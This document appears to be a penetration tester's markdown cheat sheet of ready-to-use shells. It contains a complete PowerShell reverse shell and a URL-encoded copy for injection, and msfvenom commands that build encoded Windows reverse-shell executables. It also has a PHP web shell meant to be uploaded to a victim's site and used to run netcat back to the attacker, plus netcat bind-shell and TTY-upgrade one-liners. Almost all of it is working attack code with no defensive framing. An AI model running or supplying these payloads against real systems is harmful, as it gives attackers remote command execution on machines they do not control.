# List of useful shells to keep on hand.

### If python is installed you can make the shell more stable.
* Use Python, Python2 or Python3 as required. ```python -c 'import pty; pty.spawn("/bin/sh")'```
* This allows access to terminal commands. ```export TERM=xterm```
* Background the shell using CTRL+Z. Then in your own terminal enter this ```stty raw -echo; fg``` to turn off terminal echo allowing access to tab autocompletes, the arrow keys, and Ctrl + C and foregrounds the shell.

### Powershell reverse shell. Just need to replace IP and PORT of your choice and copy into cmd.exe or another method of executing commands.
```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### URL encoded reverse shell for Windows systens. IP and Port need to be changed.
```
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```

### msfvenom
* ```msfvenom -p <PAYLOAD> <OPTIONS>``` Standard syntax.
* ```<OS>/<arch>/<payload>``` Basic convention.
* ```msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>``` Windows x64 Reverse Shell in an exe format (staged).
* ```msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe``` Windows x86 Reverse Shell with encoding.

### Simple example of a PHP reverse shell.
* Start you listener. ```nc -lvnp <PORT>```
* Save this to a file then upload to a viticim webpage. ```<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>```
* Within the address bar enter the following. ```<LOCATION OF FILE>/shell.php?cmd=nc <IP> <PORT> -e /bin/bash```

### Netcat shells.
```nc [options] [target address] [port(s)]```
* Listener ```nc -lvnp <PORT> -e /bin/bash```
* Connect via ```nc <IP> <PORT>```
* Or for a bind shell setup this listener on victim ```mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f``` then use ```nc <IP> <PORT>``` from attacking terminal.

| Netcat Option | Description |
|---------------|-------------|
| -l | Starts Netcat in listen mode. The default mode is to act as a client. |
| -L | Starts Netcat in the Windows-only "listen harder" mode. This mode creates a persistent listener that starts listening again when the client disconnects. |
| -u | Starts Netcat in UDP mode. The default is to use TCP. |
| -p | Specifies the port that Netcat should start listening on in listen mode. In client mode, it specifies the source port. |
| -e | Specifies the program to execute when a connection is made. |
| -n | Tells Netcat not to perform DNS lookups for host names on the other end of the connection. |
| -z | Starts Netcat in zero I/O mode, which instructs it to send a packet without a payload. |
| -w <seconds> | Specifies the timeout value for connections. |
| -v | Starts Netcat in verbose mode. |
| -vv | Starts Netcat in very verbose mode. |

### Bash TTY
```
SHELL=/bin/bash script -q /dev/null
Ctrl-Z
stty raw -echo
fg
reset
xterm
```
